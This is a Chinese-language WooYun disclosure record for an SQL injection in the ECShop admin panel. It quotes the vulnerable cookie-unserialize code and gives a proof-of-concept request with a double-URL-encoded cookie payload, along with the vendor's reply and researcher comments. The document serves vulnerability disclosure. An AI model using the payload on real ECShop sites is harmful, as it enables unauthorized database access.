{"id": 10226, "wybug_id": "wooyun-2013-024840", "wybug_title": "ecshop最新版本后台所有功能块通用SQL注入(全版本亦可)", "wybug_corp": "ShopEx", "wybug_author": "blue", "wybug_date": "2013-05-30 23:44", "wybug_open_date": "2013-08-28 23:45", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-07-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-28：\t细节向公众公开  简要描述： 后台的SQL注入，几乎所有的后台功能块都能用此方法注入，进入后台就可以用此提升下自己的权限了，当然，“进入后台”让这个漏洞鸡肋了，你懂的～～～ 详细说明：  $filter = unserialize(urldecode($_COOKIE['ECSCP']['lastfilter'])); 这一句是核心，urldecode看到了么？所以啊，只要%27、%2527就能绕过init.php里对$_COOKIE的addslashes_deep了～～～两个地方：1.订单详情\n/admin/order.php //158行 $filter = unserialize(urldecode($_COOKIE['ECSCP']['lastfilter']));\n2.后台几乎各功能块列表都会用到的get_filter()方法\n/admin/includes/lib_main.php //718行function get_filter($param_str = ''){    $filterfile = basename(PHP_SELF, '.php');    if ($param_str)    {        $filterfile .= $param_str;    }    if (isset($_GET['uselastfilter']) && isset($_COOKIE['ECSCP']['lastfilterfile'])        && $_COOKIE['ECSCP']['lastfilterfile'] == sprintf('%X', crc32($filterfile)))  //这虽然麻烦，但可控制    {        return array(            'filter' => unserialize(urldecode($_COOKIE['ECSCP']['lastfilter'])), //这里又见重点            'sql'    => base64_decode($_COOKIE['ECSCP']['lastfiltersql'])        );    }    else    {        return false;    }}\n\n\n看接下来的漏洞证明吧～～   漏洞证明：  订单详情的，这个好弄些\n\nget_filter方法的，拿文章列表来测试，满足触发条件可能麻烦些，说个简单的方法，把条件“==”你控制不了的那一边echo输出出来，然后控制的那一边改一下就好了（我说的不绕口吧？）\n\n相关代码（文章列表的，供测试）\nGET:http://localhost/test/ecshop/admin/article.php?is_ajax=1&uselastfilter=1POST:act=query&keyword=&cat_id=0COOKIE: ECSCP[lastfilterfile]=23A0E66; ECSCP[lastfilter]=a%253A1%253A%257Bs%253A5%253A%2522start%2522%253Bs%253A2%253A%25221%2527%2522%253B%257D; //cookie修改这两处\n怎样，有了这个，还要再找后台SQL注入么？   修复方案：  进入sql语句前，再进行过滤最靠谱   版权声明：转载请注明来源 blue@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2013-05-31 08:44 厂商回复： 感谢您为shopex安全做的贡献我们会尽快处理非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-30 23:51 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  进入后台...     \n     2013-05-31 04:38 |    \t\t少校 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 别开枪，自己人！)\t\t \n  现在ecshop的洞 前台的不好挖了 都开始挖后台了，高 实在是高！    \n     2013-05-31 08:34 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  跟着标题我就进来了    \n     2013-05-31 08:55 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  @blue 我准备今天再来2发的。你既然这么早就发了！我情何以堪啊！    \n     2013-05-31 09:11 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  都开始搞后台了，你们是闹哪样列。。。    \n     2013-05-31 09:13 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @齐迹 @少校 @xsser 那么后台的xss算不算呢？只是危害就不大了    \n     2013-05-31 09:33 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  @xfkxfk 先把sql搞完了在搞xss 后台xss 可能是1rank 呵呵    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}